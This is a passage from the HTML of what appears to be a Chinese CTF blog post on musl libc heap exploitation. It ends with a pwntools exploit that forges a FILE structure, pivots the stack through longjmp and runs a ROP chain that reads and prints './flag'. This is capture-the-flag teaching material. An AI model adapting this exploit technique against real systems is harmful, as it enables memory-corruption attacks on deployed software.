+</span></span><span class="line"><span class="cl"><span class="c1">#    0x7ffff7c49506 &lt;longjmp+14&gt;: mov    rbp,QWORD PTR [rdi+0x8]</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#    0x7ffff7c4950a &lt;longjmp+18&gt;: mov    r12,QWORD PTR [rdi+0x10]</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#    0x7ffff7c4950e &lt;longjmp+22&gt;: mov    r13,QWORD PTR [rdi+0x18]</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#    0x7ffff7c49512 &lt;longjmp+26&gt;: mov    r14,QWORD PTR [rdi+0x20]</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#    0x7ffff7c49516 &lt;longjmp+30&gt;: mov    r15,QWORD PTR [rdi+0x28]</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#    0x7ffff7c4951a &lt;longjmp+34&gt;: mov    rdx,QWORD PTR [rdi+0x30]</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#    0x7ffff7c4951e &lt;longjmp+38&gt;: mov    rsp,rdx</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># =&gt; 0x7ffff7c49521 &lt;longjmp+41&gt;: mov    rdx,QWORD PTR [rdi+0x38]</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#    0x7ffff7c49525 &lt;longjmp+45&gt;: jmp    rdx</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">magic_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x49503</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x14862</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1c237</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1bea2</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1b826</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xcdc</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x292200</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_end_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x296000</span>
+</span></span><span class="line"><span class="cl"><span class="n">stdin_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x292200</span>
+</span></span><span class="line"><span class="cl"><span class="n">stdout_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x292300</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x292430</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">stdout_struct</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x45</span><span class="p">)</span> <span class="o">+</span>                    <span class="c1"># +0x00</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span>                     <span class="c1"># +0x08</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span>                     <span class="c1"># +0x10</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x4a957</span><span class="p">)</span> <span class="o">+</span>     <span class="c1"># +0x18</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x39a8</span><span class="p">)</span> <span class="o">+</span>  <span class="c1"># +0x20</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x39a8</span><span class="p">)</span> <span class="o">+</span>  <span class="c1"># +0x28</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span>                     <span class="c1"># +0x30</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x39a8</span><span class="p">)</span> <span class="o">+</span>  <span class="c1"># +0x38</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span>                     <span class="c1"># +0x40</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x4aac3</span><span class="p">)</span> <span class="o">+</span>     <span class="c1"># +0x48</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x4aabb</span><span class="p">)</span> <span class="o">+</span>     <span class="c1"># +0x50</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x39a8</span><span class="p">)</span> <span class="o">+</span>  <span class="c1"># +0x58</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span>                     <span class="c1"># +0x60</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span>                     <span class="c1"># +0x68</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span>                     <span class="c1"># +0x70</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span>                     <span class="c1"># +0x78</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span>                     <span class="c1"># +0x80</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span> <span class="o">+</span>      <span class="c1"># +0x88</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">+</span>              <span class="c1"># +0x90</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span>                     <span class="c1"># +0x98</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span>                     <span class="c1"># +0xA0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>                       <span class="c1"># +0xA8</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">stdout_struct</span> <span class="o">=</span> <span class="n">stdout_struct</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#0x85</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># rop += p64(pop_rdi_ret)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># rop += p64(fake_file_addr) #flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;open&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_end_addr</span><span class="o">-</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_end_addr</span><span class="o">-</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;./flag&#34;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># flags</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># rpos rbp</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># rend r12</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># close r13</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># wend r14</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># wpos r15</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop_addr</span><span class="p">)</span>  <span class="c1"># mustbezero_1 rdx rsp</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>  <span class="c1"># wbase rip</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># read</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">magic_gadget</span><span class="p">)</span>  <span class="c1"># write</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># lock = 0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">+=</span>  <span class="n">fake_file</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span><span class="o">+=</span>  <span class="n">stdout_struct</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mh">0x40</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">+=</span> <span class="n">rop</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># dbg()</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="o">-</span><span class="mh">0x30e0</span><span class="o">-</span><span class="mh">0x100</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x0000000000025b40 : push rax ; ret</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">itr</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># b *0x7ffff7c00000+0x49503</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># stdin dq 0x00007ffff7e92200 32 </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># bbase 0xa9f</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># sbase 0x201FE0</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x781e1ce953c0</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="Updated on 2026-01-10 13:23:50">Updated on 2026-01-10&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/musl_pwn/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="vscode://file/D:%5cBlog%5ccontent%5cposts%5cmusl_pwn.md" title="Open in editor" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/read_qmgx/" class="post-nav-item" rel="prev" title="《亲密关系》"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>《亲密关系》</a><a href="/posts/read_jdsbj/" class="post-nav-item" rel="next" title="《基督山伯爵》">《基督山伯爵》<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#环境配置">环境配置</a>
+      <ul>
+        <li><a href="#编译libc">编译<code>libc</code></a></li>
+        <li><a href="#启动题目">启动题目</a></li>
+        <li><a href="#调试">调试</a></li>
+      </ul>
+    </li>
+    <li><a href="#ctf星ctfbabynote">*CTF（星CTF）——Babynote</a>
+      <ul>
+        <li><a href="#漏洞">漏洞</a></li>
+        <li><a href="#流程">流程</a>
+          <ul>
+            <li><a href="#第一步">第一步</a></li>
+            <li><a href="#第二步">第二步</a></li>
+            <li><a href="#第三步">第三步</a></li>
+          </ul>
+        </li>
+        <li><a href="#exp">exp</a></li>
+      </ul>
+    </li>
+    <li><a href="#hkcertctf2025-_-compress">hkcertCTF2025 _ compress</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.154.3"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.2-20260109063229-50d27e0e"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">J4f</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
+              <circle class="bg" cx="50" cy="50" r="50"></circle>
+              <circle class="progress" cx="50" cy="50" r="50"></circle>
+            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/js/config/e1fbaa725adb825c1eb7cc90e4cff26f.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
